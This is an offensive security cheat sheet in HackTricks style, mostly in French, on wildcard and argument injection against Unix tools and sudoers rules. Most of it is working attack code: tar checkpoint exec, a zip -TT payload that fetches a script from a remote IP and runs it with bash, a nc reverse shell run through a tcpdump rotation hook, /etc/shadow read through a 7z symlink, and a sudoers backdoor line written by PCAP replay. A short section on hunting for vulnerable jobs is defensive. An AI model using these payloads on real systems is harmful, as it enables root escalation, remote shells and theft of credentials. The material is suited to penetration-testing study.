# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L’injection d’arguments via wildcard (aka *glob*) se produit lorsqu’un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non entre guillemets comme `*`.
> Comme le shell développe le wildcard **avant** d’exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut fabriquer des noms de fichiers qui commencent par `-` afin qu’ils soient interprétés comme des **options au lieu de données**, ce qui permet de faire passer furtivement des flags arbitraires, voire même des commandes.
> Cette page rassemble les primitives les plus utiles, les recherches récentes et les détections modernes pour 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Lorsque root exécute plus tard quelque chose comme :
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` est injecté, ce qui fait que *tous* les fichiers correspondants héritent de la propriété/des permissions de `/root/secret``file`.

*PoC & tool* : [`wildpwn`](https://github.com/localh0t/wildpwn) (attaque combinée).
Voir aussi le papier classique DefenseCode pour plus de détails.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Exécutez des commandes arbitraires en abusant de la fonctionnalité **checkpoint** :
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Une fois que root exécute par exemple `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté en tant que root.

### bsdtar / macOS 14+

Le `tar` par défaut sur les versions récentes de macOS (basé sur `libarchive`) n’implémente pas `--checkpoint`, mais vous pouvez quand même obtenir une exécution de code avec le flag **--use-compress-program** qui permet de spécifier un compresseur externe.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Lorsqu’un script privilégié exécute `tar -cf backup.tar *`, `/bin/sh` sera lancé.

---

## rsync

`rsync` permet de remplacer le shell distant ou même le binaire distant via des options en ligne de commande qui commencent par `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archive plus tard le répertoire avec `rsync -az * backup:/srv/`, le flag injecté lance votre shell côté distant.

*PoC* : [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Même lorsque le script privilégié préfixe *défensivement* le wildcard avec `--` (pour arrêter l’analyse des options), le format 7-Zip prend en charge les **file list files** en préfixant le nom de fichier avec `@`. Le combiner avec un symlink vous permet d’*exfiltrate* des fichiers arbitraires :
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root exécute quelque chose comme :
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip essaiera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et s’arrêtera, **en imprimant le contenu sur stderr**.

Cela survit à `-- *` parce que la CLI de 7-Zip accepte explicitement à la fois les noms de fichiers normaux et `@listfiles` comme entrées positionnelles, donc un nom de fichier littéral comme `@root.txt` est toujours traité de manière spéciale.

---

## zip

Deux primitives très pratiques existent lorsqu’une application passe des noms de fichiers contrôlés par l’utilisateur à `zip` (soit via un wildcard, soit en énumérant les noms sans `--`).

- RCE via test hook: `-T` active “test archive” et `-TT <cmd>` remplace le tester par un programme arbitraire (forme longue: `--unzip-command <cmd>`). Si vous pouvez injecter des noms de fichiers qui commencent par `-`, séparez les flags sur des fichiers distincts pour que l’analyse des short-options fonctionne :
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- Ne tentez PAS un seul nom de fichier comme `'-T -TT <cmd>'` — les options courtes sont analysées caractère par caractère et cela échouera. Utilisez des tokens séparés comme montré.
- Si les slashes sont supprimés des noms de fichier par l'application, récupérez depuis un host/IP nu (chemin par défaut `/index.html`) et enregistrez localement avec `-O`, puis exécutez.
- Vous pouvez déboguer l'analyse avec `-sc` (afficher `argv` traité) ou `-h2` (plus d'aide) pour comprendre comment vos tokens sont consommés.

Exemple (comportement local sur zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak : Si la couche web renvoie `zip` stdout/stderr (courant avec des wrappers naïfs), des flags injectés comme `--help` ou des échecs dus à de mauvaises options apparaîtront dans la réponse HTTP, ce qui confirme l’injection de ligne de commande et aide à ajuster le payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Les commandes suivantes ont été abusées dans des CTF modernes et des environnements réels. Le payload est toujours créé comme un *filename* dans un répertoire inscriptible qui sera ensuite traité avec un wildcard :

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Ces primitives sont moins courantes que les classiques *tar/rsync/zip* mais valent la peine d’être vérifiées lors de la recherche.

---

## Hunting vulnerable wrappers and jobs

Des études de cas récentes ont montré que l’injection wildcard/argv n’est plus seulement un problème de **cron + tar**. La même catégorie de bug continue d’apparaître dans :

- des fonctionnalités web qui « download everything as zip/tar » depuis des répertoires d’upload contrôlés par l’attaquant
- des debug shells de vendor/appliance qui exposent un wrapper **tcpdump** avec des champs filename/filter contrôlés par l’attaquant
- des jobs de backup ou de rotation qui appellent `tar`, `rsync`, `7z`, `zip`, `chown`, ou `chmod` sur des répertoires inscriptibles

Commandes de triage utiles :
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heuristics rapides :

- `-- *` est une bonne correction pour beaucoup d’outils GNU, mais **pas** pour `7z`/`7za` parce que les `@listfiles` sont analysés séparément.
- Pour `zip`, cherchez des wrappers qui énumèrent directement des noms de fichiers contrôlés par l’utilisateur ; le découpage des short-options (`-T` + `-TT <cmd>`) fonctionne encore même sans glob shell.
- Pour `tcpdump`, faites particulièrement attention aux wrappers qui vous laissent contrôler les **noms de fichiers de sortie**, les **paramètres de rotation**, ou les arguments de **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z) : RCE via injection d'argv dans des wrappers

Quand un shell restreint ou un wrapper vendor construit une ligne de commande `tcpdump` en concaténant des champs contrôlés par l’utilisateur (par ex. un paramètre "file name") sans quoting/validation stricts, vous pouvez injecter des flags `tcpdump` supplémentaires. La combinaison de `-G` (rotation basée sur le temps), `-W` (limite le nombre de fichiers), et `-z <cmd>` (commande post-rotate) permet une exécution de commande arbitraire en tant qu’utilisateur exécutant tcpdump (souvent root sur des appliances).

Préconditions :

- Vous pouvez influencer `argv` passé à `tcpdump` (par ex. via un wrapper comme `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Le wrapper ne sanitise pas les espaces ni les tokens préfixés par `-` dans le champ du nom de fichier.

PoC classique (exécute un script de reverse shell depuis un chemin inscriptible) :
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Détails :

- `-G 1 -W 1` force une rotation immédiate après le premier paquet correspondant.
- `-z <cmd>` exécute la commande post-rotate une fois par rotation. Beaucoup de builds exécutent `<cmd> <savefile>`. Si `<cmd>` est un script/interpréteur, assurez-vous que la gestion des arguments correspond à votre payload.

Variantes sans support amovible :

- Si vous avez une autre primitive pour écrire des fichiers (par ex. un wrapper de commande séparé qui permet la redirection de sortie), déposez votre script dans un chemin connu et déclenchez `-z /bin/sh /path/script.sh` ou `-z /path/script.sh` selon la sémantique de la plateforme.
- Certains wrappers vendor rotent vers des emplacements contrôlables par l'attaquant. Si vous pouvez influencer le chemin rotaté (symlink/directory traversal), vous pouvez orienter `-z` pour exécuter du contenu que vous contrôlez entièrement sans support externe.

---

## sudoers: tcpdump avec wildcards/additional args → arbitrary write/read and root

Très courant anti-pattern sudoers :
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problèmes
- Le glob `*` et les patterns permissifs ne contraignent que le premier argument `-w`. `tcpdump` accepte plusieurs options `-w`; la dernière l’emporte.
- La règle ne fixe pas les autres options, donc `-Z`, `-r`, `-V`, etc. sont autorisées.

Primitives
- Remplacer le chemin de destination avec un second `-w` (le premier ne fait que satisfaire sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal à l’intérieur du premier `-w` pour échapper à l’arborescence contrainte:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forcer la propriété de sortie avec `-Z root` (crée des fichiers appartenant à root n’importe où) :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Écriture de contenu arbitraire en rejouant un PCAP forgé via `-r` (par exemple, pour déposer une ligne sudoers) :

<details>
<summary>Créer un PCAP qui contient la charge utile ASCII exacte et l’écrire en tant que root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lecture arbitraire de fichier/leak de secret avec `-V <file>` (interprète une liste de savefiles). Les diagnostics d’erreur réécrivent souvent des lignes, ce qui leak du contenu :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
